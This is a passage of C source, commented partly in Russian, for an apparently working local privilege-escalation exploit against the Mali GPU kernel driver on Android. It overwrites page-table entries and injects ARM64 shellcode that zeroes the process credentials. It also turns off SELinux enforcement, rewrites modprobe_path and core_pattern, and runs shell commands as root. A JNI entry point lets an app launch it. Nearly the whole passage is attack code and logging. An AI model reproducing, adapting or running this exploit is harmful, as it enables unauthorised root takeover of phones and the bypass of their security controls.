        long uid = -1;
        for (int attempt = 0; attempt < 6; attempt++) {
          // (пере)записываем шеллкод
          write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), addr, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
          usleep(150000);
          write_func(mali_fd2, func, reserved, TOTAL_RESERVED_SIZE / RESERVED_SIZE, (uint32_t*)sc, sizeof(sc)/4);
          usleep(300000);
          // (пере)записываем хиджек слота
          write_kernel_word(mali_fd, mali_fd2, pgd, reserved, slot, fab, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
          usleep(300000);
          long r = raw_syscall(nr, 0, 0, 0, 0);
          uid = getuid();
          LOG("VERIFY(12)[%d]: ret=0x%lx uid=%ld euid=%d\n", attempt, (unsigned long)r, uid, geteuid());
          if (uid == 0) break;
        }
        LOG("VERIFY(12): final uid=%d euid=%d gid=%d\n", getuid(), geteuid(), getgid());
        char ctx[128] = {0};
        int cf = open("/proc/self/attr/current", O_RDONLY);
        if (cf >= 0) { int n = read(cf, ctx, sizeof(ctx)-1); if (n > 0) ctx[n] = 0; close(cf); }
        LOG("VERIFY(12): selinux context = '%s'\n", ctx);
        exit(0);
      }

      if (g_verify_only == 14) {
        static const uint32_t tsc[] = { 0xd2808480, 0xd65f03c0 };  // movz x0,#0x4240 ; ret
        uint64_t func = env_hex("SP_FUNC",     0x19bbf0);
        uint64_t fab  = env_hex("SP_FUNC_ABS", 0xffffff800921bbf0);
        uint64_t slot = env_hex("SP_HIJACK",   0xac55E8);
        long nr = 189;
        uint64_t addr = (((func + KERNEL_BASE) >> PAGE_SHIFT) << PAGE_SHIFT) | 0x443;
        LOG("VERIFY(14): trivial shellcode test host=0x%llx\n", func);
        write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), addr, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
        usleep(150000);
        write_func(mali_fd2, func, reserved, TOTAL_RESERVED_SIZE / RESERVED_SIZE, (uint32_t*)tsc, sizeof(tsc)/4);
        LOG("VERIFY(14): written\n");
        write_kernel_word(mali_fd, mali_fd2, pgd, reserved, slot, fab, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
        LOG("VERIFY(14): before call\n");
        long r = raw_syscall(nr, 0, 0, 0, 0);
        LOG("VERIFY(14): returned r=0x%lx uid=%d\n", (unsigned long)r, getuid());
        exit(0);
      }

      if (g_verify_only == 13) {
        // Self-sweeping shellcode: ищет current->cred по диапазону оффсетов,
        // валидирует (linear-map ptr + usage + uid==2000) и обнуляет привилегии.
        static const uint32_t sweep_sc[] = {
          0xa9bb7bfd,0xa90153f3,0xa9025bf5,0xa90363f7,0xf90023f9,0xaa018019,
          0xd5384113,0xf9438a74,0xd360fe96,0xd29ff817,0xf2bffff7,0xeb1702df,
          0x54000201,0xd2800098,0xb8386a9f,0x91001318,0xf100a31f,0x54ffffa3,
          0x92800015,0xd2800518,0xf8386a95,0x91002318,0xf101431f,0x54ffffa3,
          0xb4000059,0xb900033f,0xd28a4820,0x14000002,0xd28a6960,0xf90027e0,
          0xa94153f3,0xa9425bf5,0xa94363f7,0xf94023f9,0xf94027e0,0xa8c57bfd,
          0xd65f03c0,
        };
        uint64_t func = env_hex("SP_FUNC",     0x162f50);            // host (default __alloc_page_frag)
        uint64_t fab  = env_hex("SP_FUNC_ABS", 0xffffff80091e2f50);
        uint64_t slot = env_hex("SP_HIJACK",   0xac55E8);
        long nr = (long)env_hex("SP_NR", 189);
        uint64_t addr = (((func + KERNEL_BASE) >> PAGE_SHIFT) << PAGE_SHIFT) | 0x443;
        LOG("VERIFY(13): sweep cred, host off=0x%llx, slot off=0x%llx, nr=%ld\n", func, slot, nr);
        write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), addr, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
        usleep(150000);
        write_func(mali_fd2, func, reserved, TOTAL_RESERVED_SIZE / RESERVED_SIZE, (uint32_t*)sweep_sc, sizeof(sweep_sc)/4);
        LOG("VERIFY(13): shellcode written\n");
        usleep(300000);
        write_kernel_word(mali_fd, mali_fd2, pgd, reserved, slot, fab, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
        LOG("VERIFY(13): slot hijacked\n");
        usleep(200000);
        uint64_t kill = env_hex("SP_KILL", 0xffffff800a2f21dcULL);   // selinux_enforcing → permissive (найдено сканом)
        uint64_t slo = env_hex("SP_SCAN_LO", 0), shi = env_hex("SP_SCAN_HI", 0);
        uint64_t sst = env_hex("SP_SCAN_STEP", 4);
        if (slo && shi > slo) {
          LOG("SCAN(read): collect ==1 in [0x%llx,0x%llx) step %llu\n", slo, shi, sst);
          static uint64_t cand[16384]; int nc = 0; unsigned long nn = 0;
          FILE* posf = fopen("/data/local/tmp/scan.pos", "w");
          for (uint64_t a = slo; a < shi; a += sst) {
            long v = raw_syscall(nr, (long)(a & 0xffffffffu), (long)(a >> 32), 1, 0);
            nn++;
            if ((unsigned)v == 1) { if (nc < 16384) cand[nc++] = a; }
            if ((nn & 0x7fff) == 0) LOG("SCAN@ 0x%llx nc=%d\n", a, nc);
          }
          LOG("SCAN(read) done nc=%d\n", nc);
          int found = 0;
          for (int i = 0; i < nc; i++) {
            uint64_t a = cand[i];
            if (posf) { fseek(posf, 0, SEEK_SET); fprintf(posf, "%llx\n", (unsigned long long)a); fflush(posf); }
            raw_syscall(nr, (long)(a & 0xffffffffu), (long)(a >> 32), 0, 0);
            FILE* gf = popen("/system/bin/getenforce 2>/dev/null || getenforce 2>/dev/null", "r");
            char gb[32] = {0};
            if (gf) { if (!fgets(gb, sizeof gb, gf)) gb[0] = 0; pclose(gf); }
            if (strstr(gb, "Permissive")) { LOG("FOUND selinux_enforcing @ 0x%llx\n", a); found = 1; break; }
            raw_syscall(nr, (long)(a & 0xffffffffu), (long)(a >> 32), 2, 0);   // restore to 1
          }
          if (posf) fclose(posf);
          LOG("SCAN done found=%d\n", found);
        } else {
          LOG("VERIFY(13): calling nr=%ld kill=0x%llx\n", nr, kill);
          raw_syscall(nr, (long)(kill & 0xffffffffu), (long)(kill >> 32), 0, 0);
        }
        LOG("VERIFY(13): uid=%d euid=%d gid=%d\n", getuid(), geteuid(), getgid());
        char ctx[128] = {0};
        int cf = open("/proc/self/attr/current", O_RDONLY);
        if (cf >= 0) { int n = read(cf, ctx, sizeof(ctx)-1); if (n > 0) ctx[n] = 0; close(cf); }
        LOG("VERIFY(13): selinux context = '%s'\n", ctx);
        if (getuid() == 0) {
          const char* cmd = getenv("SP_CMD");
          if (cmd && *cmd) { system(cmd); }
          else {
            system("id; echo --getenforce; getenforce; "
                   "echo --kallsyms; head -2 /proc/kallsyms 2>&1; "
                   "echo --touch-data; touch /data/local/tmp/x_ravn 2>&1 && echo DATA_OK || echo DATA_FAIL; "
                   "echo --diag; [ -f /data/local/tmp/diag.sh ] && sh /data/local/tmp/diag.sh 2>&1");
          }
        }
        exit(0);
      }

      if (g_verify_only == 11) {
        verify_hijack(mali_fd, mali_fd2, pgd, &(reserved[0]));
        exit(0);
      }

      // --- запись строки в произвольный .data-таргет (modprobe_path / core_pattern).
      if (g_verify_only == 10) {
        uint64_t tgt = env_hex("SP_TARGET", MODPROBE_PATH_SBERPORTAL);
        const char* s = getenv("SP_STR");
        if (!s || !*s) s = "/data/local/tmp/raven_helper";
        size_t len = strlen(s) + 1;
        size_t nw = (len + 3) / 4;
        uint32_t* w = (uint32_t*)calloc(nw, 4);
        if (!w) err(1, "calloc");
        memcpy(w, s, len);
        LOG("VERIFY(10): write \"%s\" (%zu bytes) -> off=0x%llx\n", s, len, tgt);
        uint64_t addr = (((tgt + KERNEL_BASE) >> PAGE_SHIFT) << PAGE_SHIFT) | 0x443;
        write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), addr, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
        usleep(100000);
        write_func(mali_fd2, tgt, reserved, TOTAL_RESERVED_SIZE / RESERVED_SIZE, w, nw);
        LOG("VERIFY(10): done\n");
        exit(0);
      }

      // --- скан диапазона .data оракулом uname (ищем init_uts_ns по live-зонам строк).
      if (g_verify_only == 9) {
        uint64_t lo = env_hex("SP_SCAN_START", 0x103c000);
        uint64_t hi = env_hex("SP_SCAN_END",   0x104e000);
        uint64_t st = env_hex("SP_SCAN_STEP",  32);
        uint64_t val = env_hex("SP_ORACLE_VALUE", 0x4e564152ULL);
        long us = (long)env_hex("SP_WR_SLEEP_US", 15000);
        if (st == 0) st = 4;
        if (us > 0) g_wr_sleep_us = (int)us;
        g_quiet = 1;
        LOG("VERIFY(9): scan [0x%llx,0x%llx) step 0x%llx sleep %ldus\n", lo, hi, st, us);
        struct utsname u1;
        int hit = 0; unsigned long n = 0;
        for (uint64_t t = lo; t < hi; t += st) {
          write_kernel_word(mali_fd, mali_fd2, pgd, &(reserved[0]), t, val, MALI_WRITE_VALUE_TYPE_IMMEDIATE_32);
          memset(&u1, 0, sizeof(u1));
          uname(&u1);
          n++;
          if (strstr(u1.sysname,"RAVN")||strstr(u1.nodename,"RAVN")||strstr(u1.release,"RAVN")||
              strstr(u1.version,"RAVN")||strstr(u1.machine,"RAVN")||strstr(u1.domainname,"RAVN")) {
            LOG("VERIFY(9): HIT at off=0x%llx after %lu tries\n", t, n);
            LOG("VERIFY(9): sysname='%s' nodename='%s' release='%s' version='%s' machine='%s'\n",
                u1.sysname, u1.nodename, u1.release, u1.version, u1.machine);
            hit = 1; break;
          }
          if ((n % 200) == 0) LOG("VERIFY(9): ...%lu tries, at 0x%llx\n", n, t);
        }
        if (!hit) LOG("VERIFY(9): no hit, %lu tries\n", n);
        exit(0);
      }

      if (g_verify_only == 7) {
        uint64_t base_tgt = env_hex("SP_ORACLE_TARGET", INIT_UTS_NS_SBERPORTAL + 0x45); // nodename
        uint64_t val = env_hex("SP_ORACLE_VALUE", 0x4e564152ULL);                       // "RAVN"
        long sweep = (long)env_hex("SP_SWEEP", 0);          // 0 = одиночная попытка
        long step  = (long)env_hex("SP_SWEEP_STEP", 0x200); // шаг сканирования, байт
        struct utsname u0, u1;
        memset(&u0, 0, sizeof(u0)); memset(&u1, 0, sizeof(u1));
        uname(&u0);
        LOG("VERIFY(7): before sysname='%s' nodename='%s' release='%s'\n", u0.sysname, u0.nodename, u0.release);
        if (sweep <= 0) sweep = 1;
        int hit = 0;
        for (long i = -(sweep/2); i <= (sweep - 1)/2; i++) {
          uint64_t tgt = (uint64_t)((int64_t)base_tgt + i * step);
          LOG("VERIFY(7): [%ld/%ld] write val=0x%llx -> off=0x%llx\n", i, sweep, val, tgt);
          write_kernel_word(mali_fd, mali_fd2, pgd, &(reserved[0]), tgt, val, MALI_WRITE_VALUE_TYPE_IMMEDIATE_32);
          usleep(300000);
          memset(&u1, 0, sizeof(u1));
          uname(&u1);
          if (strstr(u1.sysname,"RAVN")||strstr(u1.nodename,"RAVN")||strstr(u1.release,"RAVN")||
              strstr(u1.version,"RAVN")||strstr(u1.machine,"RAVN")||strstr(u1.domainname,"RAVN")) {
            LOG("VERIFY(7): ORACLE HIT at off=0x%llx (delta=%ld*0x%lx)\n", tgt, i, step);
            LOG("VERIFY(7): after sysname='%s' nodename='%s' release='%s' machine='%s'\n",
                u1.sysname, u1.nodename, u1.release, u1.machine);
            hit = 1; break;
          }
          if (i == 0) LOG("VERIFY(7): center miss, uname='%s'/'%s'\n", u1.sysname, u1.nodename);
        }
        if (!hit) LOG("VERIFY(7): no hit in %ld candidates\n", sweep);
        exit(0);
      }

      // --- оракул через /proc/version (linux_banner в .rodata) — обычный world-readable файл.
      if (g_verify_only == 8) {
        uint64_t tgt = env_hex("SP_ORACLE_TARGET", LINUX_BANNER_SBERPORTAL);
        uint64_t val = env_hex("SP_ORACLE_VALUE", 0x4e564152ULL);
        char before[512] = {0}, after[512] = {0};
        int vfd = open("/proc/version", O_RDONLY);
        if (vfd >= 0) { int n = read(vfd, before, sizeof(before)-1); if (n > 0) before[n] = 0; close(vfd); }
        LOG("VERIFY(8): /proc/version before = '%s'\n", before);
        LOG("VERIFY(8): write val=0x%llx -> off=0x%llx (linux_banner)\n", val, tgt);
        write_kernel_word(mali_fd, mali_fd2, pgd, &(reserved[0]), tgt, val, MALI_WRITE_VALUE_TYPE_IMMEDIATE_32);
        usleep(300000);
        vfd = open("/proc/version", O_RDONLY);
        if (vfd >= 0) { int n = read(vfd, after, sizeof(after)-1); if (n > 0) after[n] = 0; close(vfd); }
        LOG("VERIFY(8): /proc/version after  = '%s'\n", after);
        LOG("VERIFY(8): %s\n", (after[0]=='R'&&after[1]=='A'&&after[2]=='V'&&after[3]=='N')
            ? "ORACLE HIT -> .rodata offset confirmed" : "no change (offset missed)");
        exit(0);
      }

      // --- однооффсетный оракул: пишем маркер в core_pattern / modprobe_path и сразу
      // --- читаем значение обратно через /proc/sys (read-back подтверждает оффсет).
      if (g_verify_only == 5 || g_verify_only == 6) {
        uint64_t tgt, val;
        const char* proc;
        if (g_verify_only == 5) {
          tgt = env_hex("SP_ORACLE_TARGET", CORE_PATTERN_SBERPORTAL);
          proc = "/proc/sys/kernel/core_pattern";
        } else {
          tgt = env_hex("SP_ORACLE_TARGET", MODPROBE_PATH_SBERPORTAL);
          proc = "/proc/sys/kernel/modprobe";
        }
        val = env_hex("SP_ORACLE_VALUE", 0x4e564152ULL); // "RAVN" (little-endian)
        char before[256] = {0}, after[256] = {0};
        int pfd = open(proc, O_RDONLY);
        if (pfd >= 0) { int n = read(pfd, before, sizeof(before)-1); if (n > 0) before[n] = 0; close(pfd); }
        LOG("VERIFY(%d): %s before = '%s'\n", g_verify_only, proc, before);
        LOG("VERIFY(%d): oracle write val=0x%llx -> off=0x%llx\n", g_verify_only, val, tgt);
        write_kernel_word(mali_fd, mali_fd2, pgd, &(reserved[0]), tgt, val, MALI_WRITE_VALUE_TYPE_IMMEDIATE_32);
        usleep(300000);
        pfd = open(proc, O_RDONLY);
        if (pfd >= 0) { int n = read(pfd, after, sizeof(after)-1); if (n > 0) after[n] = 0; close(pfd); }
        LOG("VERIFY(%d): %s after  = '%s'\n", g_verify_only, proc, after);
        LOG("VERIFY(%d): %s\n", g_verify_only,
            (after[0] == 'R' && after[1] == 'A' && after[2] == 'V' && after[3] == 'N')
              ? "ORACLE HIT -> offset confirmed" : "no change (offset missed / wrong page)");
        exit(0);
      }
      if (g_verify_only == 4) {
        uint64_t phys = sel_read_handle_unknown + KERNEL_BASE;
        uint64_t data_offset = phys % 0x1000;
        uint64_t newpte = ((phys >> 12) << 12) | 0x443;
        write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), newpte,
                 atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
        usleep(200000);
        LOG("VERIFY(4): sweep VAs for hijacked PTE[%d] phys=0x%llx off=0x%llx\n",
            OVERWRITE_INDEX, phys, data_offset);
        int hits = 0, mapped = 0;
        int fds[2] = { mali_fd2, mali_fd };
        for (uint64_t va = 0x10000000ULL; va < 0x10800000ULL; va += 0x1000) {
          for (int f = 0; f < 2; f++) {
            void* m = mmap64(NULL, 0x1000, PROT_READ, MAP_SHARED, fds[f], va);
            if (m == MAP_FAILED) continue;
            mapped++;
            uint64_t v = *(uint64_t*)((char*)m + data_offset);
            if (v != 0) { if (hits < 20) LOG("  fd%d va=0x%llx -> 0x%llx\n", f, va, v); hits++; }
            munmap(m, 0x1000);
          }
        }
        LOG("VERIFY(4): mapped=%d nonzero=%d\n", mapped, hits);
        exit(0);
      }
      if (g_verify_only == 3) {
        LOG("VERIFY(3): write 0 -> selinux_enforcing (off=0x%llx)\n", selinux_enforcing);
        write_selinux(mali_fd, mali_fd2, pgd, &(reserved[0]));
        usleep(300000);
        char b = '?';
        int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
        if (efd >= 0) { if (read(efd, &b, 1) < 0) b = '!'; close(efd); }
        LOG("VERIFY(3): /sys/fs/selinux/enforce = '%c'  (expect '0')\n", b);
        exit(0);
      }
      if (g_verify_only >= 2) {
        uint64_t* pte_cpu = (uint64_t*)((char*)alias_regions[freed_idx] + pgd_idx * 0x1000);
        LOG("PTE[%d] before=0x%llx\n", OVERWRITE_INDEX, pte_cpu[OVERWRITE_INDEX]);
        uint64_t phys = sel_read_handle_unknown + KERNEL_BASE;
        uint64_t data_offset = phys % 0x1000;
        uint64_t newpte = ((phys >> 12) << 12) | 0x443;
        LOG("target phys=0x%llx off=0x%llx newpte=0x%llx pgd=0x%llx\n", phys, data_offset, newpte, pgd);
        write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), newpte,
                 atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
        usleep(300000);
        LOG("PTE[%d] after =0x%llx\n", OVERWRITE_INDEX, pte_cpu[OVERWRITE_INDEX]);
        int shown = 0, ok = 0, fail = 0, nz = 0;
        for (uint64_t i = 0; i < TOTAL_RESERVED_SIZE / RESERVED_SIZE; i++) {
          for (uint64_t a = reserved[i]; a < reserved[i] + RESERVED_SIZE * 0x1000; a += 0x1000) {
            uint64_t va[2]; va[0] = set_addr_lv3(a); va[1] = a;
            for (int k = 0; k < 2; k++) {
              void* m = mmap64(NULL, 0x1000, PROT_READ, MAP_SHARED, mali_fd2, va[k]);
              if (m == MAP_FAILED) { fail++; continue; }
              ok++;
              uint64_t v = *(uint64_t*)((char*)m + data_offset);
              if (v != 0) { nz++; if (shown < 12) { LOG("  res=0x%llx va[%d]=0x%llx -> 0x%llx\n", a, k, va[k], v); shown++; } }
              munmap(m, 0x1000);
            }
          }
        }
        LOG("mmap ok=%d fail=%d nonzero=%d\n", ok, fail, nz);
        LOG("VERIFY(2): done, NO kernel writes. exiting.\n");
        exit(0);
      }
      write_selinux(mali_fd, mali_fd2, pgd, &(reserved[0]));
      write_shellcode(mali_fd, mali_fd2, pgd, &(reserved[0]));	
      run_enforce();      
      cleanup(mali_fd, pgd);
      return 0;
    }
  }
  LOG("failed, retry.\n");
  jit_id++;
  *flush_idx += NUM_TRIALS;
  return -1;
}

#ifdef SHELL

int main() {
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  select_offset();
  if (g_verify_only >= 1) {
    dump_candidate("selinux_enforcing", selinux_enforcing);
    dump_candidate("sel_read_handle_unknown", sel_read_handle_unknown);
    dump_candidate("init_cred", g_init_cred);
    dump_candidate("commit_creds", g_commit_creds);
  }
  if (g_verify_only == 1) {
    LOG("VERIFY-ONLY: writes skipped, exiting.\n");
    return 0;
  }
  int mali_fd = open_dev(MALI);

  setup_mali(mali_fd, 0);

  void* tracking_page = setup_tracking_page(mali_fd);
  jit_init(mali_fd, 0x1000, 100, 0);


  int mali_fd2 = open_dev(MALI);
  setup_mali(mali_fd2, 1);
  setup_tracking_page(mali_fd2);
  uint64_t drain = drain_mem_pool(mali_fd2);
  release_mem_pool(mali_fd2, drain);

  int flush_idx = 0;
  // Как в оригинале: ≤ FLUSH_REGION_SIZE/NUM_TRIALS (=5) попыток на процесс,
  // затем перезапуск процесса «с нуля» (без recycle — он копил состояние и мешал
  // переиспользованию freed-страницы под page-table).
  for (int i = 0; i < 5; i++) {
    int r = trigger(mali_fd, mali_fd2, &flush_idx);
    if (r == 0) {
      LOG("=== trigger OK: should be root now ===");
      system("id; getenforce; echo RAVEN_ROOT_UID=$(id -u)");
      system("id > /data/local/tmp/raven_root.txt 2>&1; getenforce >> /data/local/tmp/raven_root.txt 2>&1; echo 'raven-rooted' >> /data/local/tmp/raven_root.txt");
      break;
    }
    if (r == -2) {
      LOG("out of flush regions -> need fresh process (attempt %d)\n", i);
      break;
    }
  }
}
#else
#include <jni.h>
JNIEXPORT int JNICALL
Java_com_example_hellojni_MaliExpService_stringFromJNI( JNIEnv* env, jobject thiz)
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    select_offset();
    if (g_verify_only >= 1) {
      dump_candidate("selinux_enforcing", selinux_enforcing);
      dump_candidate("sel_read_handle_unknown", sel_read_handle_unknown);
      dump_candidate("init_cred", g_init_cred);
      dump_candidate("commit_creds", g_commit_creds);
    }
    if (g_verify_only == 1) {
      LOG("VERIFY-ONLY: writes skipped.\n");
      return 0;
    }
    int mali_fd = open_dev(MALI);

    setup_mali(mali_fd, 0);
    void* tracking_page = setup_tracking_page(mali_fd);
    jit_init(mali_fd, 0x1000, 100, 0);

    int mali_fd2 = open_dev(MALI);
    setup_mali(mali_fd2, 1);
    setup_tracking_page(mali_fd2);

    int flush_idx = 0;
    for (int i = 0; i < 5; i++) {
        int r = trigger(mali_fd, mali_fd2, &flush_idx);
        if (r == 0) {
            LOG("uid: %d euid %d", getuid(), geteuid());
            return 0;
        }
        if (r == -2) {
            LOG("out of flush regions -> need fresh process (attempt %d)", i);
            break;
        }
    }
    return -1;
}
#endif

